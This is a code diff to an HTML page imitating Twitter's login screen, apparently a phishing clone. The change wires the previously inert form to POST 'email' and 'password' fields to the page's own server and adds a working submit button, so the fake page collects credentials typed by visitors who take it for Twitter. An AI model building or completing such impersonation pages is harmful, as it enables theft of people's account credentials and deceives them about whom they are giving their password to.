@@ -80,16 +80,16 @@
         <div class="icon col s12"><img src="https://img.icons8.com/color/48/000000/twitter.png"/></div>
         <h1>Log in to Twitter</h1>
         <div class="row">
-            <form class="col s12">
+            <form class="col s12" method="POST" action="/">
                 <div class="input-field">
-                    <input placeholder="" id="user" type="text" class="validate">
+                    <input name="email" placeholder="" id="user" type="text" class="validate">
                     <label for="user">Phone, email, or username</label>
                   </div>
                   <div class="input-field">
-                    <input placeholder="" id="sifre" type="text" class="validate">
+                    <input name="password" placeholder="" id="sifre" type="password" class="validate">
                     <label for="sifre">Password</label>
                   </div>
-                  <a class="btn">Log in</a>
+                  <button class="btn" type="submit">Log in</button>
             </form>
             <a href="" class="link1">Forgot password?</a><span class="link1">.</span><a href="" class="link1">Sign up for Twitter</a>
         </div>
